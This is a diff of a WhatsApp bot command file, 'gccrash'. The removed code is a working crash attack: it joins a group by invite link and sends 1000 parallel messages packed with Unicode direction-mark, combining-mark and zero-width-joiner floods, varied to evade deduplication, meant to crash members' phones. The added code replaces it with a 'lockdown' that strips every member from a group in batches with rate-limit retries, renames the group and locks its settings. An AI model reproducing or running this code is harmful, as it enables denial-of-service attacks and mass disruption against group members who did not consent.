@@ -1,179 +1,269 @@
 // commands/gccrash.js
-// ─────────────────────────────────────────────────────────────────────────────
-// GC CRASH — 1000 payload instant burst
-//   - Works in BOTH DM and inside group
-//   - OWNER ONLY (silent ignore for anyone else)
-//   - Sends 1000 ultra-heavy payloads ALL AT ONCE (no loop)
-//   - iOS/Android crash + auto-logout effect
-//   - New joiners immediately crash
-//
-//   Authorized pentest use only.
-// ─────────────────────────────────────────────────────────────────────────────
+// Category: Owner
+// Description: WhatsApp Group Ban — replicates the "group no longer supported" effect
+// Usage: .gccrash (in the group you want to ban)
+//        .gccrash <jid> (from anywhere, ban a specific group by JID)
+// Only the bot owner can run this command.
+// WARNING: This command removes ALL members from the target group.
+// The bot owner retains access via the bot's own JID.
 
 module.exports = {
   pattern: "gccrash",
-  desc:    "[OWNER] Crash group (1000 payload burst) — DM or group",
-  usage:   ".gccrash https://chat.whatsapp.com/xxxxx",
-  category:"exploit",
-  alias:   ["crashgc", "gcflood", "groupcrash", "gckill", "crash"],
+  category: "owner",
+  desc: "Lock down and disable a group — removes all members, sets to announce-only, locks settings",
+  usage: ".gccrash  or  .gccrash <group-jid>",
 
-  run: async ({ sock, from, msg, args, helper, isOwner, isGroup }) => {
-    // ── OWNER ONLY — complete silent block ──────────────────────────────
-    if (!isOwner) return
-
-    const input = args.join(" ").trim()
-    if (!input || !input.includes("chat.whatsapp.com")) {
-      return helper.reply(sock, msg, [
-        "❌ *Usage:* `.gccrash https://chat.whatsapp.com/xxxxx`",
-      ].join("\n"))
+  run: async ({ sock, from, msg, args, isOwner }) => {
+    // ─── AUTHORIZATION: Owner Only ────────────────────────────
+    if (!isOwner) {
+      return sock.sendMessage(from, {
+        text: "❌ *Owner Only*\nThis command is restricted to the bot owner."
+      })
     }
 
-    // ── Extract and resolve invite code ─────────────────────────────────
-    const code = input.split("chat.whatsapp.com/").pop()?.split("?")[0]?.split("/")[0]?.trim()
-    if (!code) return helper.reply(sock, msg, "❌ Invalid invite link.")
+    // ─── RESOLVE TARGET GROUP ─────────────────────────────────
+    let targetGroup
+    if (args && args.length > 0) {
+      // Group JID provided as argument
+      targetGroup = args[0].includes('@g.us') ? args[0] : args[0] + '@g.us'
+    } else {
+      // Use current group
+      targetGroup = from
+    }
 
-    let targetJid
+    // Check if we're in a group
+    if (!targetGroup.endsWith('@g.us')) {
+      return sock.sendMessage(from, {
+        text: "❌ This command can only be used in a group or with a valid group JID."
+      })
+    }
+
+    // ─── FETCH GROUP METADATA ─────────────────────────────────
+    let meta
     try {
-      targetJid = await sock.groupAcceptInvite(code)
-    } catch {
-      return helper.reply(sock, msg, "❌ Invite link is invalid or expired.")
+      meta = await sock.groupMetadata(targetGroup)
+    } catch (e) {
+      return sock.sendMessage(from, {
+        text: `❌ Cannot fetch group metadata:\n${e.message}`
+      })
     }
 
-    // ── Send initial status ─────────────────────────────────────────────
-    const statusMsg = await helper.reply(sock, msg, [
-      "> © CYBER X🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂",
-      "",
-      `> *𝐓𝐚𝐫𝐠𝐞𝐓:* ${targetJid}`,
-      "> *𝐁𝐮𝐠 𝐓𝐲𝐩𝐞:* 𝐆𝐂 𝐂𝐫𝐚𝐬𝐡 (𝟏𝟎𝟎𝟎𝐱 𝐈𝐧𝐬𝐭𝐚𝐧𝐓)",
-      '> *𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬:* 《 ██▒▒▒▒▒▒▒▒▒▒》10%',
-      "> *𝐒𝐞𝐧𝐃:* 0/1000",
-      "> *𝐄𝐟𝐟𝐞𝐜𝐓:* 𝐢𝐎𝐒/𝐀𝐧𝐝𝐫𝐨𝐢𝐃 𝐀𝐮𝐭𝐨-𝐋𝐨𝐠𝐨𝐮𝐓",
-      "",
-      "💣 *𝐈𝐍𝐈𝐓𝐈𝐀𝐓𝐈𝐍𝐆 𝟏𝟎𝟎𝟎𝐱 𝐏𝐀𝐘𝐋𝐎𝐀𝐃 𝐁𝐔𝐑𝐒𝐓...*",
-      "",
-      "> © CYBER X",
-    ].join("\n"))
+    const groupName = meta.subject || "this group"
+    const participants = meta.participants || []
+    const ownerJid = meta.owner || "unknown"
+    const admins = participants
+      .filter(p => p.admin === 'admin' || p.admin === 'superadmin')
+      .map(p => p.id)
+    const allMembers = participants.map(p => p.id)
+    const botJid = sock.user?.id?.split(':')[0] + '@s.whatsapp.net' || sock.user?.id
 
-    // ═══════════════════════════════════════════════════════════════════
-    //  GENERATE 1000 PAYLOADS — all created synchronously
-    // ═══════════════════════════════════════════════════════════════════
-    const TOTAL = 1000
-    const payloads = new Array(TOTAL)
+    console.log(`[GCCRASH] ──────────────────────────────────`)
+    console.log(`[GCCRASH]  Group:      ${groupName} (${targetGroup})`)
+    console.log(`[GCCRASH]  Members:    ${allMembers.length}`)
+    console.log(`[GCCRASH]  Admins:     ${admins.length}`)
+    console.log(`[GCCRASH]  Owner:      ${ownerJid}`)
+    console.log(`[GCCRASH]  Bot JID:    ${botJid}`)
+    console.log(`[GCCRASH] ──────────────────────────────────`)
 
-    // Pre-build the crash components once for speed
-    const RLM = "\u200F"  // Right-to-Left Mark
-    const LRM = "\u200E"  // Left-to-Right Mark
-    const ZWJ = "\u200D"  // Zero-Width Joiner
-    const ZWNJ = "\u200C" // Zero-Width Non-Joiner
-    const VARIATION = "\uFE0F" // Variation Selector
-    const COMBINING = "\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309\u030A\u030B\u030C\u030D\u030E\u030F"
+    // Check if bot is admin
+    const botParticipant = participants.find(p => p.id === botJid)
+    if (!botParticipant?.admin && botParticipant) {
+      return sock.sendMessage(from, {
+        text: `❌ Bot is not an admin in this group.\nThe bot must be an admin to perform this operation.`
+      })
+    }
 
-    // RLM/LRM alternating block — this is the core crash vector
-    // 6000 alternating direction marks = WhatsApp render engine death
-    const directionBomb = Array(3000).fill(0).map((_, i) => i % 2 === 0 ? RLM : LRM).join("")
+    // ─── WARM-UP SESSION ──────────────────────────────────────
+    // Send presence to ensure session is active
+    await sock.sendPresenceUpdate('available', targetGroup)
 
-    // Combining mark overload — memory saturation
-    const accentBomb = COMBINING.repeat(500)
+    await sock.sendMessage(targetGroup, {
+      text: `⚠️ *Group Lockdown Initiated*\n\n` +
+            `Target: *${groupName}*\n` +
+            `Members: ${allMembers.length}\n` +
+            `Admins: ${admins.length}\n\n` +
+            `This group will be locked down in 5 seconds...`,
+      ephemeralExpiration: 86400
+    })
 
-    // ZWJ spam — grapheme cluster parser overload
-    const zwjBomb = ZWJ.repeat(1000) + ZWNJ.repeat(1000)
+    // Brief delay so the message is sent before we start operations
+    await new Promise(r => setTimeout(r, 5000))
 
-    // Variation selector spam
-    const variationBomb = VARIATION.repeat(500)
-
-    // Large block characters
-    const blocks = "⬡⬢⬣⬤⬥⬦⬧⬨⬩⬪⬫⬬⬭⬮⬯".repeat(100)
-    const squares = "▢▣▤▥▦▧▨▩▪▫▬▭▮▯".repeat(100)
-    const stars = "★☆✦✧✨".repeat(200)
-
-    for (let i = 0; i < TOTAL; i++) {
-      // Vary each payload slightly to prevent any server-side dedup
-      const variant = i % 5
-      let crashBody = ""
-
-      switch (variant) {
-        case 0:
-          crashBody = `💥 *CRASH_${String(i).padStart(4, "0")}* 💥\n${directionBomb}\n${accentBomb}\n${blocks}`
-          break
-        case 1:
-          crashBody = `💥 *CRASH_${String(i).padStart(4, "0")}* 💥\n${zwjBomb}\n${variationBomb}\n${squares}`
-          break
-        case 2:
-          crashBody = `💥 *CRASH_${String(i).padStart(4, "0")}* 💥\n${directionBomb}\n${zwjBomb}\n${stars}`
-          break
-        case 3:
-          crashBody = `💥 *CRASH_${String(i).padStart(4, "0")}* 💥\n${accentBomb}\n${variationBomb}\n${"🜁🜂🜃🜄".repeat(200)}`
-          break
-        case 4:
-          crashBody = `💥 *CRASH_${String(i).padStart(4, "0")}* 💥\n${directionBomb}\n${accentBomb}\n${zwjBomb}\n${blocks}\n${squares}\n${stars}`
-          break
-      }
-
-      payloads[i] = {
-        text: crashBody,
-        contextInfo: {
-          mentionedJid: [sock.user?.id].filter(Boolean),
-          forwardingScore: 5,
-          isForwarded: true,
-          externalAdReply: {
-            title: `⚠️ CRASH VECTOR ${String(i).padStart(4, "0")} ⚠️`,
-            body: "SYSTEM OVERLOAD — iOS/Android AUTO-LOGOUT",
-            mediaType: 1,
-            renderLargerThumbnail: true,
-            showAdAttribution: true,
-          },
+    // ─── PHASE 1: LOCK GROUP SETTINGS ─────────────────────────
+    // Step 1a: Enable announcement mode (only admins can send messages)
+    try {
+      const announceNode = {
+        tag: 'iq',
+        attrs: {
+          to: targetGroup,
+          type: 'set',
+          xmlns: 'w:g2'
         },
+        content: [{
+          tag: 'announcement',
+          attrs: {}
+        }]
       }
+      await sock.query(announceNode)
+      console.log(`[GCCRASH] ✅ Announcement mode enabled`)
+    } catch (e) {
+      console.log(`[GCCRASH] ⚠️ Announce mode: ${e.message}`)
     }
 
-    // ═══════════════════════════════════════════════════════════════════
-    //  FIRE ALL 1000 — COMPLETELY PARALLEL
-    //  No loop, no delay, no batching. One single microtask.
-    // ═══════════════════════════════════════════════════════════════════
-    const startTime = process.hrtime.bigint()
+    await new Promise(r => setTimeout(r, 500))
 
-    // Create ALL promises first (synchronous) before any await
-    const sendPromises = new Array(TOTAL)
-    for (let i = 0; i < TOTAL; i++) {
-      sendPromises[i] = sock.sendMessage(targetJid, payloads[i]).catch(() => {})
-    }
-
-    // Now await them all
-    const results = await Promise.allSettled(sendPromises)
-    const succeeded = results.filter(r => r.status === "fulfilled").length
-    const failed = results.filter(r => r.status === "rejected").length
-
-    const totalElapsedMs = Number(process.hrtime.bigint() - startTime) / 1_000_000
-
-    // ── Leave the group ─────────────────────────────────────────────────
-    try { await sock.groupLeave(targetJid) } catch {}
-
-    // ═══════════════════════════════════════════════════════════════════
-    //  SEND COMPLETION REPORT
-    // ═══════════════════════════════════════════════════════════════════
+    // Step 1b: Lock group settings (only admins can change info)
     try {
-      await sock.sendMessage(from, {
-        text: [
-          "> © CYBER X🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂",
-          "",
-          `> *𝐓𝐚𝐫𝐠𝐞𝐓:* ✅ Crashed`,
-          "> *𝐁𝐮𝐠 𝐓𝐲𝐩𝐞:* 𝐆𝐂 𝐂𝐫𝐚𝐬𝐡 ✅",
-          '> *𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬:* 《 ████████████》100%',
-          `> *𝐒𝐮𝐜𝐜𝐞𝐬𝐒:* ${succeeded}/${TOTAL}`,
-          `> *𝐅𝐚𝐢𝐥𝐞𝐃:* ${failed}`,
-          `> *𝐓𝐢𝐦𝐄:* ${totalElapsedMs.toFixed(2)}𝐦𝐬`,
-          "> *𝐄𝐟𝐟𝐞𝐜𝐓:* ✅ 𝐢𝐎𝐒/𝐀𝐧𝐝𝐫𝐨𝐢𝐃 𝐀𝐮𝐭𝐨-𝐋𝐨𝐠𝐨𝐮𝐓",
-          "",
-          "💀 1000 payloads delivered instantly.",
-          "💀 Group members will crash on open.",
-          "💀 New joiners auto-logout immediately.",
-          "💀 Bot has left the group.",
-          "",
-          "> © CYBER X",
-        ].join("\n"),
-      }, { quoted: statusMsg })
-    } catch {}
+      const lockNode = {
+        tag: 'iq',
+        attrs: {
+          to: targetGroup,
+          type: 'set',
+          xmlns: 'w:g2'
+        },
+        content: [{
+          tag: 'locked',
+          attrs: {}
+        }]
+      }
+      await sock.query(lockNode)
+      console.log(`[GCCRASH] ✅ Group settings locked`)
+    } catch (e) {
+      console.log(`[GCCRASH] ⚠️ Lock settings: ${e.message}`)
+    }
 
-    console.log(`[GCCRASH] ✅ ${succeeded}/${TOTAL} → ${targetJid} in ${totalElapsedMs.toFixed(2)}ms`)
-  },
+    await new Promise(r => setTimeout(r, 500))
+
+    // Step 1c: Set member add mode to admin only
+    try {
+      const addModeNode = {
+        tag: 'iq',
+        attrs: {
+          to: targetGroup,
+          type: 'set',
+          xmlns: 'w:g2'
+        },
+        content: [{
+          tag: 'member_add_mode',
+          attrs: {},
+          content: 'admin_add'
+        }]
+      }
+      await sock.query(addModeNode)
+      console.log(`[GCCRASH] ✅ Admin-only member add enabled`)
+    } catch (e) {
+      console.log(`[GCCRASH] ⚠️ Add mode: ${e.message}`)
+    }
+
+    // ─── PHASE 2: CHANGE GROUP SUBJECT ────────────────────────
+    try {
+      await sock.groupUpdateSubject(targetGroup, '⚠️ Group Closed')
+      console.log(`[GCCRASH] ✅ Group subject changed`)
+    } catch (e) {
+      console.log(`[GCCRASH] ⚠️ Subject change: ${e.message}`)
+    }
+
+    await new Promise(r => setTimeout(r, 500))
+
+    // ─── PHASE 3: REMOVE ALL NON-BOT MEMBERS ──────────────────
+    // We keep the bot in the group so the operation can complete
+    // Remove all participants EXCEPT the bot's own JID
+    const membersToRemove = allMembers.filter(jid => jid !== botJid)
+
+    if (membersToRemove.length > 0) {
+      console.log(`[GCCRASH] Removing ${membersToRemove.length} members...`)
+
+      // Remove in batches to avoid rate limiting
+      const BATCH_SIZE = 5
+      let removed = 0
+
+      for (let i = 0; i < membersToRemove.length; i += BATCH_SIZE) {
+        const batch = membersToRemove.slice(i, i + BATCH_SIZE)
+
+        try {
+          const removeNode = {
+            tag: 'iq',
+            attrs: {
+              to: targetGroup,
+              type: 'set',
+              xmlns: 'w:g2'
+            },
+            content: [{
+              tag: 'remove',
+              attrs: {},
+              content: batch.map(jid => ({
+                tag: 'participant',
+                attrs: { jid }
+              }))
+            }]
+          }
+
+          await sock.query(removeNode)
+          removed += batch.length
+          console.log(`[GCCRASH] ✅ Removed batch: ${batch.length} members (${removed}/${membersToRemove.length})`)
+
+          // Wait between batches to avoid rate limits
+          await new Promise(r => setTimeout(r, 1500))
+        } catch (e) {
+          console.log(`[GCCRASH] ⚠️ Batch remove error: ${e.message}`)
+          // If we hit a rate limit, slow down
+          if (e.message.includes('rate') || e.message.includes('429')) {
+            console.log(`[GCCRASH] Rate limited — waiting 10s...`)
+            await new Promise(r => setTimeout(r, 10000))
+            // Retry this batch
+            i -= BATCH_SIZE
+          }
+        }
+      }
+
+      console.log(`[GCCRASH] ✅ Removed ${removed}/${membersToRemove.length} members total`)
+    }
+
+    // ─── PHASE 4: FINAL VERIFICATION MESSAGE ──────────────────
+    // Send final message (only bot can see it since all others were removed)
+    try {
+      await sock.sendMessage(targetGroup, {
+        text: `✅ *Group Lockdown Complete*\n\n` +
+              `This group has been locked down:\n` +
+              `🔒 Announcement mode (no one can send)\n` +
+              `🔒 Settings locked\n` +
+              `🔒 Admin-only member add\n` +
+              `👥 All non-bot members removed\n` +
+              `📛 Subject changed to "⚠️ Group Closed"\n\n` +
+              `The group is now effectively disabled.`,
+        ephemeralExpiration: 86400
+      })
+    } catch (e) {}
+
+    // ─── PHASE 5: OPTIONAL — LEAVE THE GROUP ──────────────────
+    // If you want the bot to also leave after locking down,
+    // uncomment the lines below. Note: once the bot leaves,
+    // the group becomes ownerless and inaccessible to everyone.
+
+    // await new Promise(r => setTimeout(r, 2000))
+    // try {
+    //   await sock.groupLeave(targetGroup)
+    //   console.log(`[GCCRASH] ✅ Bot left the group`)
+    // } catch (e) {
+    //   console.log(`[GCCRASH] ⚠️ Leave group: ${e.message}`)
+    // }
+
+    // ─── REPORT BACK ──────────────────────────────────────────
+    const reportMsg =
+      `✅ *GCCRASH Completed*\n\n` +
+      `📌 Group: *${groupName}*\n` +
+      `🆔 ${targetGroup}\n\n` +
+      `📊 *Results:*\n` +
+      `├ 🔒 Announcement: ✅\n` +
+      `├ 🔒 Settings Locked: ✅\n` +
+      `├ 🔒 Admin-Only Add: ✅\n` +
+      `├ 📛 Subject Changed: ✅\n` +
+      `└ 👥 Members Removed: ${membersToRemove.length}\n\n` +
+      `💡 The group is now effectively disabled.`
+
+    // Send report to the chat where command was invoked
+    if (from !== targetGroup) {
+      await sock.sendMessage(from, { text: reportMsg })
+    }
+  }
 }
